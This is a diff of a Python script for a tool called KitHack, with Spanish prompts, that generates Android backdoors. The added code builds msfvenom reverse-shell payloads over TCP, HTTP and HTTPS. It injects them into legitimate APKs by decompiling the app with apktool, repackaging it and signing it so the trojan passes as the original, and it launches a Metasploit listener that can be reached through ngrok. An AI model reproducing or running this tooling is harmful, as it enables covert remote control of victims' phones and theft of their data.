-					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
-					time.sleep(4)
-					os.system('service postgresql start && msfvenom -x {0} -p android/shell/reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
-					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
-		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+					print '{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN)
+					print '{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW)
+					print '{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW)
+
+					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+
+					if m == 1:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system('service postgresql start && msfvenom -x {0} -p android/shell/reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
+						location = os.getcwd()
+						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))					
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()		
+
+					elif m == 2:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system("service postgresql start && msfvenom -p android/shell/reverse_http LPORT={0} LHOST={1} R > output/payload.apk".format(LPORT, LHOST))
+						location = os.getcwd()
+						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
+						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)				
+						os.system('bash lib/apkf.sh')
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/original -o output/kithack.apk')
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()								
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
+					
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("{}\n[X] OPCION INVALIDA\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						os.system('clear')
 						banner(), menu(), options()	
 
 				else:
-					print("{}\n[X] OPCION INVALIDA\n".format(RED))
+					print("\n{}[X] OPCION INVALIDA\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
 					os.system('clear')
 					banner(), menu(), options()	
 
 			elif pay == 6:
+				print '{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN)
 				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
 				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
 				
@@ -1790,63 +2504,300 @@ def options():
 				
 				if a == 1:
 					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
 					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
-		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
+					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
+						print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+						if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))					
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+							while LHOST != "0.tcp.ngrok.io":
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+						banner(), menu(), options()	
+				
+				elif a == 2:
+					print '{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN)
+					print '{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW)
+					print '{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW)
+
+					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+
+					if m == 1:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system('service postgresql start && msfvenom -x {0} -p android/shell/reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
+						location = os.getcwd()
+						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+
+					elif m == 2:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system("service postgresql start && msfvenom -p android/shell/reverse_https LPORT={0} LHOST={1} R > output/payload.apk".format(LPORT, LHOST))
+						location = os.getcwd()
+						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
+						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)				
+						os.system('bash lib/apkf.sh')
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/original -o output/kithack.apk')
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+
+					else:
+						print("{}\n[X] OPCION INVALIDA\n".format(RED))
+						time.sleep(3)
+						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+						os.system('clear')
+						banner(), menu(), options()	
+
+				else:
+					print("\n{}[X] OPCION INVALIDA\n".format(RED))
+					time.sleep(3)
+					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+					os.system('clear')
+					banner(), menu(), options()	
+
+			elif pay == 7:
+				print '{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN)
+				print '{0}[01]{1} APK MSF'.format(WHITE, YELLOW)
+				print '{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW)
+				
+				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+				
+				if a == 1:
+					os.system('python lib/network.py')
+					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					mainout = os.path.splitext(OUT)[0]
+					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+					time.sleep(4)
+					os.system('service postgresql start && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
+					location = os.getcwd()
+					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
+						print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+						if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							while LHOST != "0.tcp.ngrok.io":
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
+								pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+					else:
+						print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						time.sleep(3)
+						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 			
 				elif a == 2:
-					os.system('python lib/network.py')
-					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
-					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					Tk().withdraw()
-					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
-					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
-					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
-					time.sleep(4)
-					os.system('service postgresql start && msfvenom -x {0} -p android/shell/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
-					location = os.getcwd()
-					print("\033[1;32m")
-					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
-		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
-						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-							os.system('service postgresql stop && clear')
-							banner(), menu(), options()	
+					print '{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN)
+					print '{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW)
+					print '{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW)
+
+					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+					
+					if m == 1:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system('service postgresql start && msfvenom -x {0} -p android/shell/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
+						location = os.getcwd()
+						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()		
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))					
-							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-							os.system('service postgresql stop && clear')
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()		
+
+					elif m == 2:
+						os.system('python lib/network.py')
+						LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+						LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+						Tk().withdraw()
+						APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
+						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+						mainout = os.path.splitext(OUT)[0]
+						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
+						time.sleep(4)
+						os.system("service postgresql start && msfvenom -p android/shell/reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk".format(LPORT, LHOST))
+						location = os.getcwd()
+						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
+						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
+						time.sleep(4)
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)				
+						os.system('bash lib/apkf.sh')
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/original -o output/kithack.apk')
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 							banner(), menu(), options()	
+
 					else:
-						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+						print("{}\n[X] OPCION INVALIDA\n".format(RED))
 						time.sleep(3)
 						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()		
+						os.system('clear')
+						banner(), menu(), options()	
 
 				else:
-					print("{}\n[X] OPCION INVALIDA\n".format(RED))
+					print("\n{}[X] OPCION INVALIDA\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
